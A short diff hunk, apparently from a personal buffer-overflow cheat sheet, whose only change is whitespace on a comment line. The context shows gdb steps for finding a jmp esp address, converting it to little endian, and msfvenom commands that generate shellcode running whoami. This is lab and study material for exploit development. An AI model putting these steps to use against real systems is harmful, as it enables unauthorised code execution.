@@ -349,7 +349,7 @@ info proc map                                                         #GET THE F
 find /b 0xf7de1000,0xffffe000,0xff,0xe4
   first after heap | last in stack |
 
- #0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"                       #TAKE THE FIRST 4 AND CONVERT TO LITTLE ENDIAN, STACK IS 0xf7de1000 TO 0xffffe000
+ #0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"                      #TAKE THE FIRST 4 AND CONVERT TO LITTLE ENDIAN, STACK IS 0xf7de1000 TO 0xffffe000
 
 msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 msfvenom -p <payload> <options> -b '\x00'-f python
